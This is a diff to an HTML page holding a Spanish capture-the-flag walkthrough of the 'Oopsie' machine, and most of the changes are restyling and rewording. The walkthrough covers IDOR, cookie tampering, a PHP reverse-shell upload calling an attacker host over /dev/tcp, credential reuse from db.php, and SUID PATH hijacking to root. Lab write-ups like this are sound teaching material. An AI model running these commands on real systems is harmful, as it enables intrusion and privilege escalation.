@@ -10,9 +10,9 @@
     --bg: #0a0c0f;
     --bg2: #0f1318;
     --bg3: #141920;
-    --accent: #00ff9d;
+    --accent: #3b82f6;
     --accent2: #ff6b35;
-    --accent3: #7b61ff;
+    --accent3: #60a5fa;
     --text: #c8d6e5;
     --text-dim: #5a7080;
     --border: #1e2d3d;
@@ -39,8 +39,8 @@
       0deg,
       transparent,
       transparent 2px,
-      rgba(0,255,157,0.015) 2px,
-      rgba(0,255,157,0.015) 4px
+      rgba(59,130,246,0.012) 2px,
+      rgba(59,130,246,0.012) 4px
     );
     pointer-events: none;
     z-index: 999;
@@ -59,15 +59,15 @@
     position: absolute;
     inset: 0;
     background:
-      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(0,255,157,0.08) 0%, transparent 70%),
-      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(255,107,53,0.06) 0%, transparent 60%);
+      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(37,99,235,0.12) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(59,130,246,0.06) 0%, transparent 60%);
   }
 
   .header-tag {
     font-family: 'Share Tech Mono', monospace;
     font-size: 11px;
     letter-spacing: 4px;
-    color: var(--accent);
+    color: var(--accent3);
     text-transform: uppercase;
     margin-bottom: 16px;
     opacity: 0.8;
@@ -84,8 +84,8 @@
   }
 
   h1 .glow {
-    color: var(--accent);
-    text-shadow: 0 0 40px rgba(0,255,157,0.5), 0 0 80px rgba(0,255,157,0.15);
+    color: var(--accent3);
+    text-shadow: 0 0 40px rgba(96,165,250,0.6), 0 0 80px rgba(96,165,250,0.2);
   }
 
   .header-meta {
@@ -103,11 +103,11 @@
     border: 1px solid;
     letter-spacing: 2px;
   }
-  .tag.linux  { border-color: var(--accent);  color: var(--accent); }
-  .tag.web    { border-color: var(--accent3); color: var(--accent3); }
-  .tag.suid   { border-color: var(--accent2); color: var(--accent2); }
-  .tag.idor   { border-color: var(--yellow);  color: var(--yellow); }
-  .tag.path   { border-color: var(--red);     color: var(--red); }
+  .tag.linux { border-color: var(--accent);  color: var(--accent); }
+  .tag.web   { border-color: var(--accent3); color: var(--accent3); }
+  .tag.idor  { border-color: var(--yellow);  color: var(--yellow); }
+  .tag.suid  { border-color: var(--accent2); color: var(--accent2); }
+  .tag.path  { border-color: var(--red);     color: var(--red); }
 
   .container {
     max-width: 900px;
@@ -172,7 +172,7 @@
     margin: 20px 0;
     font-family: 'Share Tech Mono', monospace;
     font-size: 13px;
-    color: #a8d8b0;
+    color: #93c5fd;
     overflow-x: auto;
     position: relative;
     line-height: 1.8;
@@ -181,8 +181,8 @@
 
   .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
   .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
-  .code-block.shell  { border-left-color: var(--accent3); color: #b8a8e8; }
   .code-block.php    { border-left-color: var(--yellow);  color: #f0e080; }
+  .code-block.shell  { border-left-color: var(--accent3); color: #b8a8e8; }
 
   .code-label {
     font-family: 'Share Tech Mono', monospace;
@@ -216,7 +216,7 @@
   }
 
   .finding.info::before    { content: 'INFO';  background: var(--accent3); color: #fff; }
-  .finding.success::before { content: 'PWN';   background: var(--accent);  color: #000; }
+  .finding.success::before { content: 'PWN';   background: var(--accent);  color: #fff; }
   .finding.vuln::before    { content: 'VULN';  background: var(--red); color: #fff; }
   .finding.explain::before { content: 'CÓMO FUNCIONA'; background: var(--yellow); color: #000; }
 
@@ -254,7 +254,7 @@
     color: var(--text);
   }
 
-  .ports-table tr:hover td { background: rgba(0,255,157,0.03); }
+  .ports-table tr:hover td { background: rgba(59,130,246,0.03); }
   .port-open { color: var(--accent); }
   .port-num  { color: var(--accent2); font-weight: bold; }
 
@@ -320,7 +320,7 @@
     font-family: 'Share Tech Mono', monospace;
     font-size: 13px;
     color: var(--accent);
-    background: rgba(0,255,157,0.07);
+    background: rgba(59,130,246,0.08);
     padding: 1px 6px;
   }
 
@@ -350,11 +350,11 @@
     color: var(--text);
   }
 
-  .cookie-table tr:hover td { background: rgba(123,97,255,0.04); }
+  .cookie-table tr:hover td { background: rgba(59,130,246,0.03); }
 
   .flag-box {
-    background: rgba(0,255,157,0.04);
-    border: 1px solid rgba(0,255,157,0.2);
+    background: rgba(59,130,246,0.04);
+    border: 1px solid rgba(59,130,246,0.25);
     padding: 16px 24px;
     margin: 20px 0;
     display: flex;
@@ -497,12 +497,7 @@
       </tbody>
     </table>
 
-    <p>La superficie es reducida: una web y SSH. Al acceder a <code>http://&lt;IP_VICTIMA&gt;</code> encontramos la página de una empresa de reparación de coches. A simple vista no hay ningún panel de login ni ruta obvia de acceso.</p>
-
-    <div class="finding info">
-      <div class="finding-title">Tarea 1 — ¿Con qué tipo de herramienta se puede interceptar tráfico web?</div>
-      Respuesta: <strong style="color:#fff">proxy</strong>
-    </div>
+    <p>La superficie es reducida: una web y SSH. Al acceder a <code>http://&lt;IP_VICTIMA&gt;</code> aparece la página de una empresa de reparación de coches. A simple vista no hay ningún panel de login ni ruta obvia de acceso.</p>
   </section>
 
   <!-- FASE 2: ENUMERACIÓN WEB -->
@@ -513,20 +508,23 @@
     </div>
     <h2><span class="yellow">ENUMERACIÓN WEB</span> — Descubriendo el panel de login</h2>
 
-    <p>Para descubrir rutas ocultas, configuramos <strong>Burp Suite</strong> como proxy del navegador e interceptamos el tráfico al cargar la página principal. En el <em>Site map</em> de Burp, entre los recursos que la página solicita de forma pasiva, aparece una petición GET a:</p>
+    <p>Configuramos <strong>Burp Suite</strong> como proxy del navegador e interceptamos el tráfico al cargar la página principal. En el <em>Site map</em> de Burp aparece, entre los recursos cargados pasivamente, una petición GET a <code>/cdn-cgi/login/script.js</code>, lo que delata la existencia del directorio.</p>
 
-    <div class="code-block">/cdn-cgi/login/script.js</div>
+    <div class="finding info">
+      <div class="finding-title">Tarea 1</div>
+      ¿Con qué tipo de herramienta se puede interceptar tráfico web? → <strong style="color:#fff">proxy</strong>
+    </div>
 
-    <p>Esto delata la existencia del directorio <code>/cdn-cgi/login</code>. Accedemos directamente a esa ruta:</p>
+    <p>Accedemos directamente a la ruta descubierta:</p>
 
     <div class="code-label">ruta descubierta</div>
-    <div class="code-block cmd">http://&lt;IP_VICTIMA&gt;/cdn-cgi/login</div>
+    <div class="code-block">http://&lt;IP_VICTIMA&gt;/cdn-cgi/login</div>
 
-    <p>Aparece un panel de login con usuario y contraseña, y la opción <strong>"Login as Guest"</strong>.</p>
+    <p>Aparece un panel de login con la opción <strong>"Login as Guest"</strong>.</p>
 
     <div class="finding success">
-      <div class="finding-title">Tarea 2 — ¿Cuál es la ruta del directorio que devuelve el panel de login?</div>
-      Respuesta: <strong style="color:#fff">/cdn-cgi/login</strong>
+      <div class="finding-title">Tarea 2</div>
+      ¿Cuál es la ruta del directorio que devuelve el panel de login? → <strong style="color:#fff">/cdn-cgi/login</strong>
     </div>
   </section>
 
@@ -542,7 +540,7 @@
 
     <div class="code-block">http://&lt;IP_VICTIMA&gt;/cdn-cgi/login/admin.php?content=accounts&amp;id=2</div>
 
-    <p>El parámetro <code>id=2</code> referencia directamente el registro de nuestra cuenta en la base de datos. Este es el indicador clásico de un <strong>IDOR</strong> (Insecure Direct Object Reference): el servidor confía ciegamente en el valor del parámetro sin validar que el usuario autenticado tenga permisos para ver ese recurso.</p>
+    <p>El parámetro <code>id=2</code> referencia directamente el registro de nuestra cuenta en la base de datos. Este es el indicador clásico de un <strong>IDOR</strong> (Insecure Direct Object Reference): el servidor confía ciegamente en el valor del parámetro sin verificar que el usuario tenga permisos para acceder a ese recurso.</p>
 
     <div class="finding vuln">
       <div class="finding-title">¿Dónde está la vulnerabilidad?</div>
@@ -552,11 +550,15 @@
     <p>Cambiamos el parámetro a <code>id=1</code>, ya que el primer usuario registrado suele ser el administrador:</p>
 
     <div class="code-label">explotación del IDOR</div>
-    <div class="code-block cmd">http://&lt;IP_VICTIMA&gt;/cdn-cgi/login/admin.php?content=accounts&amp;id=1</div>
+    <div class="code-block">http://&lt;IP_VICTIMA&gt;/cdn-cgi/login/admin.php?content=accounts&amp;id=1</div>
 
     <table class="ports-table">
       <thead>
-        <tr><th>ACCESS ID</th><th>NAME</th><th>EMAIL</th></tr>
+        <tr>
+          <th>ACCESS ID</th>
+          <th>NAME</th>
+          <th>EMAIL</th>
+        </tr>
       </thead>
       <tbody>
         <tr>
@@ -568,8 +570,8 @@
     </table>
 
     <div class="finding success">
-      <div class="finding-title">Tarea 4 — ¿Cuál es el Access ID del usuario administrador?</div>
-      Respuesta: <strong style="color:#fff">34322</strong>
+      <div class="finding-title">Tarea 4</div>
+      ¿Cuál es el Access ID del usuario administrador? → <strong style="color:#fff">34322</strong>
     </div>
   </section>
 
@@ -582,18 +584,18 @@
     <h2><span class="accent2">COOKIE HIJACKING</span> — Escalada a administrador</h2>
 
     <div class="finding info">
-      <div class="finding-title">Tarea 3 — ¿Qué se puede modificar en Firefox para acceder a la página de uploads?</div>
-      Respuesta: <strong style="color:#fff">cookie</strong>
+      <div class="finding-title">Tarea 3</div>
+      ¿Qué se puede modificar en Firefox para acceder a la página de uploads? → <strong style="color:#fff">cookie</strong>
     </div>
 
-    <p>La sesión de usuario en la aplicación se gestiona mediante dos cookies: <code>role</code> y <code>user</code>. Con el Access ID del administrador obtenido por IDOR podemos suplantar su sesión modificando estas cookies desde las DevTools del navegador (<strong>F12 → Application → Cookies</strong>) o desde Burp Suite.</p>
+    <p>La sesión se gestiona mediante dos cookies: <code>role</code> y <code>user</code>. Con el Access ID del administrador obtenido por IDOR podemos suplantar su sesión modificando estas cookies desde las DevTools del navegador (<strong>F12 → Application → Cookies</strong>).</p>
 
     <div class="flow">
       <div class="flow-step">
         <div class="flow-icon">1</div>
         <div class="flow-content">
           <div class="flow-title">Abrir DevTools → Application → Cookies</div>
-          <div class="flow-desc">Navegamos al panel e inspeccionamos las cookies de sesión actuales correspondientes a la cuenta de invitado.</div>
+          <div class="flow-desc">Inspeccionamos las cookies de sesión actuales, correspondientes a la cuenta de invitado.</div>
         </div>
       </div>
       <div class="flow-step"><div class="flow-connector"></div><div></div></div>
@@ -609,14 +611,18 @@
         <div class="flow-icon">3</div>
         <div class="flow-content">
           <div class="flow-title">Recargar la página</div>
-          <div class="flow-desc">El servidor lee las cookies modificadas, asume que somos el administrador y muestra el panel completo incluyendo la pestaña de <strong>Uploads</strong>.</div>
+          <div class="flow-desc">El servidor lee las cookies modificadas, asume que somos el administrador y muestra el panel completo con la pestaña de <strong>Uploads</strong> habilitada.</div>
         </div>
       </div>
     </div>
 
     <table class="cookie-table">
       <thead>
-        <tr><th>COOKIE</th><th>VALOR ORIGINAL (GUEST)</th><th>VALOR MODIFICADO</th></tr>
+        <tr>
+          <th>COOKIE</th>
+          <th>VALOR ORIGINAL (GUEST)</th>
+          <th>VALOR MODIFICADO</th>
+        </tr>
       </thead>
       <tbody>
         <tr>
@@ -647,32 +653,29 @@
     <h2><span class="red">WEB SHELL</span> — Ejecución remota de código</h2>
 
     <div class="finding info">
-      <div class="finding-title">Tarea 5 — Al subir un archivo, ¿en qué directorio aparece en el servidor?</div>
-      Respuesta: <strong style="color:#fff">/uploads</strong>
+      <div class="finding-title">Tarea 5</div>
+      Al subir un archivo, ¿en qué directorio aparece en el servidor? → <strong style="color:#fff">/uploads</strong>
     </div>
 
-    <p>Con la sesión de administrador activa, accedemos a la sección de <em>Branding Image Uploads</em>. El formulario permite subir archivos <strong>sin validar su tipo ni contenido</strong>, lo que nos permite subir directamente una reverse shell en PHP.</p>
+    <p>Con la sesión de administrador activa accedemos a la sección de <em>Branding Image Uploads</em>. El formulario permite subir archivos <strong>sin validar su tipo ni contenido</strong>, lo que nos permite subir directamente una reverse shell en PHP.</p>
 
     <div class="code-label">shell.php</div>
     <div class="code-block php">&lt;?php
 exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP_ATACANTE&gt;/4444 0&gt;&amp;1'");
 ?&gt;</div>
 
-    <p>Subimos el fichero <code>shell.php</code> a través del formulario de uploads. Antes de activarla nos ponemos en escucha con netcat en nuestra máquina:</p>
+    <p>Subimos el fichero a través del formulario y nos ponemos en escucha con netcat:</p>
 
-    <div class="code-label">listener en nuestra máquina</div>
+    <div class="code-label">listener</div>
     <div class="code-block cmd">nc -lvnp 4444</div>
 
-    <p>Activamos la shell navegando a la ruta donde el servidor ha guardado el archivo:</p>
+    <p>Activamos la shell navegando al archivo subido:</p>
 
     <div class="code-label">activar la reverse shell</div>
-    <div class="code-block cmd">http://&lt;IP_VICTIMA&gt;/uploads/shell.php</div>
+    <div class="code-block">http://&lt;IP_VICTIMA&gt;/uploads/shell.php</div>
 
-    <div class="code-label">conexión recibida</div>
     <div class="code-block output">www-data@oopsie:/$ whoami
 www-data</div>
-
-    <p>Estamos dentro del sistema como <code>www-data</code>, el usuario que ejecuta el servidor web Apache.</p>
   </section>
 
   <!-- FASE 6: ESCALADA HORIZONTAL -->
@@ -684,22 +687,21 @@ www-data</div>
     <h2><span class="accent">ESCALADA HORIZONTAL</span> — De www-data a robert</h2>
 
     <div class="finding info">
-      <div class="finding-title">Tarea 6 — ¿Qué archivo contiene la contraseña compartida con el usuario robert?</div>
-      Respuesta: <strong style="color:#fff">db.php</strong>
+      <div class="finding-title">Tarea 6</div>
+      ¿Qué archivo contiene la contraseña compartida con el usuario robert? → <strong style="color:#fff">db.php</strong>
     </div>
 
-    <p>Enumeramos el sistema de archivos en busca de credenciales. En el directorio donde reside la aplicación de login encontramos un archivo de configuración de base de datos:</p>
+    <p>Enumeramos el sistema de archivos en busca de credenciales. En el directorio de la aplicación de login encontramos un archivo de configuración de base de datos con credenciales en texto plano:</p>
 
     <div class="code-label">inspección del directorio de login</div>
-    <div class="code-block cmd">ls -la /var/www/html/cdn-cgi/login/
-cat /var/www/html/cdn-cgi/login/db.php</div>
+    <div class="code-block cmd">cat /var/www/html/cdn-cgi/login/db.php</div>
 
     <div class="code-label">contenido de db.php</div>
     <div class="code-block php">&lt;?php
 $conn = mysqli_connect('localhost', 'robert', 'M3g4C0rpUs3r!', 'garage');
 ?&gt;</div>
 
-    <p>Las credenciales de la base de datos están almacenadas en texto plano. El usuario <code>robert</code> reutiliza la misma contraseña para su cuenta del sistema operativo:</p>
+    <p>El usuario <code>robert</code> reutiliza la misma contraseña para su cuenta del sistema:</p>
 
     <div class="code-label">cambio de usuario</div>
     <div class="code-block cmd">su robert
@@ -723,28 +725,24 @@ f2c74ee8db7983851ab2a96a44eb7981</div>
     <h2><span class="accent2">PRIVILEGE ESCALATION</span> — SUID + Path Hijacking</h2>
 
     <div class="finding info">
-      <div class="finding-title">Tarea 7 — ¿Qué ejecutable se usa con "-group bugtracker" para identificar archivos del grupo?</div>
-      Respuesta: <strong style="color:#fff">find</strong>
+      <div class="finding-title">Tarea 7</div>
+      ¿Qué ejecutable se usa con <code>-group bugtracker</code> para identificar archivos del grupo? → <strong style="color:#fff">find</strong>
     </div>
 
-    <p>Buscamos binarios con el bit SUID activado pertenecientes al grupo <code>bugtracker</code>, del que el usuario robert es miembro:</p>
+    <p>Buscamos binarios con el bit SUID activado pertenecientes al grupo <code>bugtracker</code>, del que robert es miembro:</p>
 
-    <div class="code-label">búsqueda de binarios SUID del grupo bugtracker</div>
+    <div class="code-label">búsqueda de binarios SUID</div>
     <div class="code-block cmd">find / -group bugtracker -ls 2>/dev/null</div>
 
-    <div class="code-label">resultado</div>
     <div class="code-block output">264151  12 -rwsr-xr--  1 root  bugtracker  8792 Jan 25 2020 /usr/bin/bugtracker</div>
 
     <div class="finding info">
-      <div class="finding-title">Tarea 8 y 9 — SUID y propietario efectivo</div>
-      La <strong style="color:#fff">s</strong> en los permisos de propietario (<code>-rws</code>) indica el bit <strong style="color:#fff">SUID (Set owner User ID)</strong>. Independientemente del usuario que lo ejecute, el binario siempre correrá con los privilegios de su dueño: <strong style="color:#fff">root</strong>.
+      <div class="finding-title">Tareas 8 y 9</div>
+      La <strong style="color:#fff">s</strong> en los permisos (<code>-rws</code>) indica el bit <strong style="color:#fff">SUID (Set owner User ID)</strong>. Sin importar quién lo ejecute, el binario siempre corre con los privilegios de su dueño: <strong style="color:#fff">root</strong>.
     </div>
 
-    <p>Ejecutamos el binario para analizar su comportamiento interno:</p>
+    <p>Ejecutamos el binario para analizar su comportamiento:</p>
 
-    <div class="code-block cmd">bugtracker</div>
-
-    <div class="code-label">comportamiento del binario</div>
     <div class="code-block output">------------------
 : EV Bug Tracker :
 ------------------
@@ -753,47 +751,19 @@ Provide Bug ID: 12
 --------------
 cat: /root/reports/12: No such file or directory</div>
 
-    <p>El binario llama al comando <code>cat</code> usando una <strong>ruta relativa</strong> en lugar de la ruta absoluta <code>/bin/cat</code>. Para resolver qué ejecutable usar, el sistema busca en los directorios del <code>$PATH</code> de izquierda a derecha y utiliza el primero que encuentre.</p>
+    <p>El binario llama a <code>cat</code> usando una <strong>ruta relativa</strong>. Para resolverlo, el sistema busca en los directorios del <code>$PATH</code> de izquierda a derecha y usa el primero que encuentre.</p>
 
     <div class="finding vuln">
-      <div class="finding-title">¿Dónde está la vulnerabilidad?</div>
-      Un binario SUID que invoca comandos sin ruta absoluta es vulnerable a <strong>path hijacking</strong>: si controlamos el <code>$PATH</code>, podemos engañar al binario (que se ejecuta como root) para que llame a un <code>cat</code> malicioso nuestro en lugar del legítimo del sistema.
+      <div class="finding-title">Vulnerabilidad</div>
+      Un binario SUID que invoca comandos sin ruta absoluta es vulnerable a <strong>path hijacking</strong>: si controlamos el <code>$PATH</code>, podemos hacer que el binario (ejecutado como root) llame a un <code>cat</code> malicioso nuestro en lugar del legítimo del sistema.
     </div>
 
     <div class="finding info">
-      <div class="finding-title">Tarea 10 — ¿Qué ejecutable se llama de forma insegura?</div>
-      Respuesta: <strong style="color:#fff">cat</strong>
+      <div class="finding-title">Tarea 10</div>
+      ¿Qué ejecutable se llama de forma insegura? → <strong style="color:#fff">cat</strong>
     </div>
 
-    <p>Explotamos la vulnerabilidad en tres pasos:</p>
-
-    <div class="flow">
-      <div class="flow-step">
-        <div class="flow-icon">1</div>
-        <div class="flow-content">
-          <div class="flow-title">Crear el <code>cat</code> malicioso en /tmp</div>
-          <div class="flow-desc">Escribimos un script que lance una bash con el flag <code>-p</code>, que preserva el EUID (effective UID). Al ejecutarse como root, la bash heredará esos privilegios.</div>
-        </div>
-      </div>
-      <div class="flow-step"><div class="flow-connector"></div><div></div></div>
-      <div class="flow-step">
-        <div class="flow-icon">2</div>
-        <div class="flow-content">
-          <div class="flow-title">Inyectar /tmp al inicio del PATH</div>
-          <div class="flow-desc">Al colocar <code>/tmp</code> antes que <code>/usr/bin</code> y <code>/bin</code> en el PATH, el sistema encontrará primero nuestro <code>cat</code> falso cuando <code>bugtracker</code> lo busque.</div>
-        </div>
-      </div>
-      <div class="flow-step"><div class="flow-connector"></div><div></div></div>
-      <div class="flow-step">
-        <div class="flow-icon">3</div>
-        <div class="flow-content">
-          <div class="flow-title">Ejecutar bugtracker</div>
-          <div class="flow-desc">El binario SUID (corriendo como root) busca <code>cat</code>, lo encuentra en <code>/tmp</code> y lo ejecuta con privilegios de root, entregándonos una shell privilegiada.</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="code-label">explotación completa</div>
+    <div class="code-label">explotación — path hijacking</div>
     <div class="code-block cmd">cd /tmp
 
 # 1. Crear el cat malicioso
@@ -804,10 +774,9 @@ chmod +x cat
 # 2. Inyectar /tmp al inicio del PATH
 export PATH=/tmp:$PATH
 
-# 3. Lanzar el binario SUID
+# 3. Ejecutar el binario SUID
 bugtracker</div>
 
-    <div class="code-label">resultado</div>
     <div class="code-block output">------------------
 : EV Bug Tracker :
 ------------------
@@ -817,7 +786,7 @@ Provide Bug ID: 12
 root@oopsie:/tmp# whoami
 root</div>
 
-    <p>Tenemos shell de root. Leemos la flag usando la ruta absoluta de <code>cat</code> para no volver a invocar nuestro script malicioso:</p>
+    <p>El binario SUID ejecuta nuestro <code>cat</code> con privilegios de root, que lanza una bash con <code>-p</code> preservando el EUID. Leemos la flag con ruta absoluta para no invocar de nuevo nuestro script:</p>
 
     <div class="code-block cmd">/bin/cat /root/root.txt</div>
 
@@ -840,25 +809,25 @@ root</div>
         <div class="chain-icon">01</div>
         <div class="chain-content">
           <div class="chain-title">Enumeración con Burp Suite</div>
-          <div class="chain-desc">El tráfico pasivo interceptado por Burp revela la ruta oculta <code>/cdn-cgi/login</code> con el panel de login de la aplicación.</div>
+          <div class="chain-desc">El tráfico pasivo interceptado revela la ruta oculta <code>/cdn-cgi/login</code> con el panel de login de la aplicación</div>
         </div>
       </div>
       <div class="chain-step"><div class="chain-connector"></div><div></div></div>
 
       <div class="chain-step">
-        <div class="chain-icon" style="border-color: var(--accent3); color: var(--accent3);">02</div>
+        <div class="chain-icon">02</div>
         <div class="chain-content">
           <div class="chain-title">IDOR → Access ID del admin</div>
-          <div class="chain-desc">Cambiando <code>id=2</code> a <code>id=1</code> en la URL se filtra el Access ID <code>34322</code> del administrador sin ningún control de autorización.</div>
+          <div class="chain-desc">Cambiando <code>id=2</code> a <code>id=1</code> en la URL se filtra el Access ID <code>34322</code> del administrador sin ningún control de autorización</div>
         </div>
       </div>
       <div class="chain-step"><div class="chain-connector"></div><div></div></div>
 
       <div class="chain-step">
-        <div class="chain-icon" style="border-color: var(--yellow); color: var(--yellow);">03</div>
+        <div class="chain-icon">03</div>
         <div class="chain-content">
           <div class="chain-title">Cookie Hijacking → panel admin</div>
-          <div class="chain-desc">Modificando <code>role=admin</code> y <code>user=34322</code> en las cookies, el servidor concede acceso completo al panel de administración con la sección de uploads.</div>
+          <div class="chain-desc">Modificando <code>role=admin</code> y <code>user=34322</code> en las cookies el servidor concede acceso completo al panel de uploads</div>
         </div>
       </div>
       <div class="chain-step"><div class="chain-connector"></div><div></div></div>
@@ -867,7 +836,7 @@ root</div>
         <div class="chain-icon" style="border-color: var(--red); color: var(--red);">04</div>
         <div class="chain-content">
           <div class="chain-title">Web Shell PHP → RCE como www-data</div>
-          <div class="chain-desc">El uploader no valida el tipo de archivo. Se sube <code>shell.php</code> y se accede a <code>/uploads/shell.php</code> para obtener una reverse shell en el servidor.</div>
+          <div class="chain-desc">El uploader no valida el tipo de archivo → se sube <code>shell.php</code> → reverse shell desde <code>/uploads/shell.php</code></div>
         </div>
       </div>
       <div class="chain-step"><div class="chain-connector"></div><div></div></div>
@@ -876,7 +845,7 @@ root</div>
         <div class="chain-icon" style="border-color: var(--accent2); color: var(--accent2);">05</div>
         <div class="chain-content">
           <div class="chain-title">Credenciales en db.php → usuario robert</div>
-          <div class="chain-desc"><code>db.php</code> expone la contraseña de la base de datos en texto plano. Robert reutiliza esa misma contraseña para su cuenta del sistema.</div>
+          <div class="chain-desc"><code>db.php</code> expone la contraseña en texto plano → robert reutiliza la misma contraseña en el sistema → flag de usuario</div>
         </div>
       </div>
       <div class="chain-step"><div class="chain-connector"></div><div></div></div>
@@ -885,7 +854,7 @@ root</div>
         <div class="chain-icon" style="border-color: var(--accent); color: var(--accent);">⚡</div>
         <div class="chain-content">
           <div class="chain-title" style="color: var(--accent);">Path Hijacking SUID → Root</div>
-          <div class="chain-desc">El binario <code>bugtracker</code> (SUID root) invoca <code>cat</code> por ruta relativa. Creando un <code>cat</code> malicioso en <code>/tmp</code> e inyectándolo al PATH se obtiene una shell de root.</div>
+          <div class="chain-desc">Binario <code>bugtracker</code> (SUID root) llama a <code>cat</code> con ruta relativa → <code>/tmp/cat</code> malicioso + PATH manipulado → shell de root</div>
         </div>
       </div>
     </div>
